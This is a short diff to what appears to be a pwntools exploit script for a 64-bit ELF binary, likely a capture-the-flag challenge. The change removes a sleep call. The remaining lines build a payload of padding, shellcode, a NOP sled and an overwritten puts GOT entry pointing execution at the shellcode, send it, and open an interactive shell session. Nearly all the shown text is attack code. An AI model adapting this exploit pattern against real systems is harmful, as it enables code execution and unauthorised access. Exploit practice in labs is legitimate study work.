@@ -19,10 +19,7 @@ nop = asm('nop',arch='amd64')   #64 bits ELF
 puts_got_addr = '601020'
 shellcode_addr = p64(0x6010a0 + 0x8)
 
-import time
-time.sleep(8)
 payload = 'A'*7 + '\0' + shellcode + nop*10 + puts_got_addr + '\0'*18 + shellcode_addr
-
 r.send(payload)
 r.interactive()
 
